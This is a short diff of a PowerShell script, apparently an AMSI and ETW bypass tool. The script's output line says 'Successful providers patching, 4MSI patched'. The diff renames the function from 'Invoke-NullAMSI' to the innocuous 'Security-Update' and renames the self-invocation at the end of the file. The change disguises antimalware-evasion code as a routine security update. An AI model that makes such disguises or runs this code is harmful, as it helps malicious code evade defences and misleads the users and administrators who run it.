@@ -1,4 +1,4 @@
-function Invoke-NullAMSI {
+function Security-Update {
     param
     (
 
@@ -260,4 +260,4 @@ function Invoke-NullAMSI {
     Write-Host "[*] Successful providers patching, 4MSI patched" -ForegroundColor Green
 }
 
-Invoke-NullAmsi -etw -v
+Security-Update -etw -v
